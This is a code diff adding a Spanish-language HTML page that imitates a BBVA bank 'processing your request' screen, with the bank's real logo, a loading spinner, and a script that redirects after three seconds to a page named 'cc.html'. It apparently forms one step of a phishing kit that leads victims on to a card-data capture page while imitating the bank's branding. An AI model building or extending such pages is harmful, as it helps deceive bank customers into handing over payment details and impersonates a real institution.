@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA - Procesando</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #004481;
+            color: white;
+            font-family: 'BentonSansBBVA', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        
+        @font-face {
+            font-family: 'BentonSansBBVA';
+            src: url('assets/fonts/BentonSansBBVA-Book.woff2') format('woff2'),
+                 url('assets/fonts/BentonSansBBVA-Book.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+        
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+            width: 120px;
+            height: auto;
+        }
+        
+        .loading-text {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .status-message {
+            margin-top: 40px;
+            font-size: 16px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <img src="https://www.bbva.es/content/dam/library/logos/logo-bbva.svg" alt="BBVA Logo" class="logo">
+        <div class="loading-spinner"></div>
+        <h1>Procesando su solicitud</h1>
+        <div class="loading-text">Finalizando verificación</div>
+        <div class="status-message">Su operación está siendo procesada, espere por favor...</div>
+    </div>
+
+    <script>
+        setTimeout(function() {
+            window.location.href = 'cc.html';
+        }, 3000); // Redirection après 3 secondes
+    </script>
+</body>
+</html>
